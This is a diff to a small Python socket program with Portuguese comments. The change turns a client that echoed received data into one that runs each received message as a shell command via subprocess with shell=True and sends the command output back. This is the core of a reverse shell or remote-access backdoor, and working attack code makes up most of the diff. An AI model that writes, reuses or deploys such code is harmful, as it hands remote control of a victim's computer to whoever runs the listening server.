@@ -29,19 +29,16 @@ def executa(socket):
             dados = socket.recv(1024)
             if(not dados): # servidor desconectou, recomeça
                 return
-            print(dados)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-            socket.send(dados)
+            else:
+                try:
+                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                    retorno = comando.stdout.read() + comando.stderr.read()
+                    socket.send(retorno)
+                except:
+                    return
         except: # algum erro ocorreu, recomeça
             return
-    '''
-        comando = ' '.join([str(novo) for novo in novo_descriptografado])
-        try:
-            a = subprocess.check_output(comando, shell=True)
-            conexao.send(a)
-        except subprocess.CalledProcessError as e:
-            print(e)
-            conexao.send(str(e))
-    '''
+
 def main():
     ip='127.0.0.1'
     porta=1025
